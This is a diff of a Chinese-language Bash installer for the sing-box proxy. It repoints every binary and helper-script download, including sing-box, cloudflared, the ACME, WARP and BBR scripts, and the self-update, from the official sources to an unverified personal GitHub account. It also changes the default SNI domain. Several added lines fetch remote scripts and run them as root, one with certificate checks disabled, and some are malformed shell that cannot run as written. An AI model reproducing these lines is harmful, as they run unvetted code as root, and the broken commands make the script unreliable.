@@ -195,9 +195,9 @@ inssb(){
 red "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 green "一、开始下载并安装Sing-box正式版内核……请稍等"
 echo
-sbcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/SagerNet/sing-box | grep -Eo '"[0-9.]+",' | sed -n 1p | tr -d '",')
+sbcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/xxf185/sing-box | grep -Eo '"[0-9.]+",' | sed -n 1p | tr -d '",')
 sbname="sing-box-$sbcore-linux-$cpu"
-wget -q -O /etc/s-box/sing-box.tar.gz https://github.com/SagerNet/sing-box/releases/download/v$sbcore/$sbname.tar.gz
+wget -q -O /etc/s-box/sing-box.tar.gz https://github.com/xxf185/sing-box/releases/download/v$sbcore/$sbname.tar.gz
 if [[ -f '/etc/s-box/sing-box.tar.gz' ]]; then
 tar xzf /etc/s-box/sing-box.tar.gz -C /etc/s-box
 mv /etc/s-box/$sbname/sing-box /etc/s-box
@@ -215,8 +215,8 @@ fi
 }
 inscertificate(){
 ymzs(){
-ym_vl_re=www.yahoo.com
-blue "Vless-reality的SNI域名默认为 www.yahoo.com"
+ym_vl_re=one-piece.com
+blue "Vless-reality的SNI域名默认为 one-piece.com"
 blue "Vmess-ws将开启TLS，Hysteria-2、Tuic-v5将使用 $(cat /root/ygkkkca/ca.log 2>/dev/null) 证书，并开启SNI证书验证"
 tlsyn=true
 ym_vm_ws=$(cat /root/ygkkkca/ca.log 2>/dev/null)
@@ -228,8 +228,8 @@ certificatec_tuic='/root/ygkkkca/cert.crt'
 certificatep_tuic='/root/ygkkkca/private.key'
 }
 zqzs(){
-ym_vl_re=www.yahoo.com
-blue "Vless-reality的SNI域名默认为 www.yahoo.com"
+ym_vl_re=one-piece.com
+blue "Vless-reality的SNI域名默认为 one-piece.com"
 blue "Vmess-ws将关闭TLS，Hysteria-2、Tuic-v5将使用bing自签证书，并关闭SNI证书验证"
 tlsyn=false
 ym_vm_ws=www.bing.com
@@ -272,7 +272,7 @@ readp "请选择：" menu
 if [ -z "$menu" ] || [ "$menu" = "1" ] ; then
 zqzs
 else
-bash <(curl -Ls https://gitlab.com/rwkgyg/acme-script/raw/main/acme.sh)
+bash <(curl -Ls wget -N --no-check-certificate https://raw.githubusercontent.com/xxf185/acme/master/acme.sh && bash acme.sh)
 if [[ ! -f /root/ygkkkca/cert.crt && ! -f /root/ygkkkca/private.key && ! -s /root/ygkkkca/cert.crt && ! -s /root/ygkkkca/private.key ]]; then
 red "Acme证书申请失败，继续使用自签证书" 
 zqzs
@@ -1567,7 +1567,7 @@ case $(uname -m) in
 aarch64) cpu=arm64;;
 x86_64) cpu=amd64;;
 esac
-curl -sL -o /etc/s-box/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$cpu
+curl -sL -o /etc/s-box/cloudflared https://github.com/xxf185/cloudflared/releases/latest/download/cloudflared-linux-$cpu
 chmod +x /etc/s-box/cloudflared
 /etc/s-box/cloudflared tunnel --url http://localhost:$(jq -r '.inbounds[1].listen_port' /etc/s-box/sb.json) --edge-ip-version auto --no-autoupdate --protocol http2 > /etc/s-box/argo.log 2>&1 &
 echo "$!" > /etc/s-box/sbargopid.log
@@ -1578,7 +1578,7 @@ blue "Argo隧道申请成功且验证有效，域名：$argo" && sleep 2
 else
 cfargo
 fi
-curl -sL https://gitlab.com/rwkgyg/sing-box-yg/-/raw/main/version/version | awk -F "更新内容" '{print $1}' | head -n 1 > /etc/s-box/v
+curl -sL https://raw.githubusercontent.com/xxf185/sb4in1/main/version/version | awk -F "更新内容" '{print $1}' | head -n 1 > /etc/s-box/v
 clear
 red "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 lnsb && blue "Sing-box安装成功，脚本快捷方式为 sb" && cronsb
@@ -1609,8 +1609,8 @@ fi
 green "0：返回上层"
 readp "请选择：" menu
 if [ "$menu" = "1" ]; then
-readp "请输入vless-reality域名 (回车使用www.yahoo.com)：" menu
-ym_vl_re=${menu:-www.yahoo.com}
+readp "请输入vless-reality域名 (回车使用one-piece.com)：" menu
+ym_vl_re=${menu:-one-piece.com}
 a=$(jq -r '.inbounds[0].tls.server_name' /etc/s-box/sb.json)
 b=$(jq -r '.inbounds[0].tls.reality.handshake.server' /etc/s-box/sb.json)
 c=$(cat /etc/s-box/vl_reality.txt | cut -d'=' -f5 | cut -d'&' -f1)
@@ -2307,7 +2307,7 @@ crontab /tmp/crontab.tmp
 rm /tmp/crontab.tmp
 }
 lnsb(){
-curl -sL -o /usr/bin/sb https://gitlab.com/rwkgyg/sing-box-yg/-/raw/main/sb.sh
+curl -sL -o /usr/bin/sb https://raw.githubusercontent.com/xxf185/sb4in1/main/sb.sh
 chmod +x /usr/bin/sb
 }
 upsbyg(){
@@ -2315,12 +2315,12 @@ if [[ ! -f '/usr/bin/sb' ]]; then
 red "未正常安装Sing-box-yg" && exit
 fi
 lnsb
-curl -sL https://gitlab.com/rwkgyg/sing-box-yg/-/raw/main/version/version | awk -F "更新内容" '{print $1}' | head -n 1 > /etc/s-box/v
+curl -sL https://raw.githubusercontent.com/xxf185/sb4in1/main/version/version | awk -F "更新内容" '{print $1}' | head -n 1 > /etc/s-box/v
 green "Sing-box-yg安装脚本升级成功" && sleep 5 && sb
 }
 lapre(){
-latcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/SagerNet/sing-box | grep -Eo '"[0-9.]+",' | sed -n 1p | tr -d '",')
-precore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/SagerNet/sing-box | sed -n 4p | tr -d ',"' | awk '{print $1}')
+latcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/xxf185/sing-box | grep -Eo '"[0-9.]+",' | sed -n 1p | tr -d '",')
+precore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/xxf185/sing-box | sed -n 4p | tr -d ',"' | awk '{print $1}')
 inscore=$(/etc/s-box/sing-box version 2>/dev/null | awk '/version/{print $NF}')
 }
 upsbcroe(){
@@ -2331,15 +2331,15 @@ green "1：升级/切换Sing-box最新正式版 v$latcore  ${bblue}${lat}${plain
 green "2：升级/切换Sing-box最新测试版 v$precore  ${bblue}${pre}${plain}"
 readp "请选择：" menu
 if [ "$menu" = "1" ]; then
-upcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/SagerNet/sing-box | grep -Eo '"[0-9.]+",' | sed -n 1p | tr -d '",')
+upcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/xxf185/sing-box | grep -Eo '"[0-9.]+",' | sed -n 1p | tr -d '",')
 elif [ "$menu" = "2" ]; then
-upcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/SagerNet/sing-box | sed -n 4p | tr -d ',"' | awk '{print $1}')
+upcore=$(curl -Ls https://data.jsdelivr.com/v1/package/gh/xxf185/sing-box | sed -n 4p | tr -d ',"' | awk '{print $1}')
 else
 sb
 fi
 green "开始下载并更新Sing-box内核……请稍等"
 sbname="sing-box-$upcore-linux-$cpu"
-wget -q -O /etc/s-box/sing-box.tar.gz https://github.com/SagerNet/sing-box/releases/download/v$upcore/$sbname.tar.gz
+wget -q -O /etc/s-box/sing-box.tar.gz https://github.com/xxf185/sing-box/releases/download/v$upcore/$sbname.tar.gz
 if [[ -f '/etc/s-box/sing-box.tar.gz' ]]; then
 tar xzf /etc/s-box/sing-box.tar.gz -C /etc/s-box
 mv /etc/s-box/$sbname/sing-box /etc/s-box
@@ -2449,17 +2449,17 @@ sb
 fi
 }
 acme(){
-bash <(curl -Ls https://gitlab.com/rwkgyg/acme-script/raw/main/acme.sh)
+bash <(curl -Ls wget -N --no-check-certificate https://raw.githubusercontent.com/xxf185/acme/master/acme.sh && bash acme.sh)
 }
 cfwarp(){
-bash <(curl -Ls https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh)
+bash <(curl -Ls bash <(curl -fsSL https://raw.githubusercontent.com/xxf185/warp/main/warp.sh))
 }
 bbr(){
 if [[ $vi =~ lxc|openvz ]]; then
 yellow "当前VPS的架构为 $vi，不支持开启原版BBR加速" && sleep 2 && exit 
 else
 green "点击任意键，即可开启BBR加速，ctrl+c退出"
-bash <(curl -Ls https://raw.githubusercontent.com/teddysun/across/master/bbr.sh)
+bash <(curl -Ls https://raw.githubusercontent.com/xxf185/bbr/main/tcp.sh)
 fi
 }
 showprotocol(){
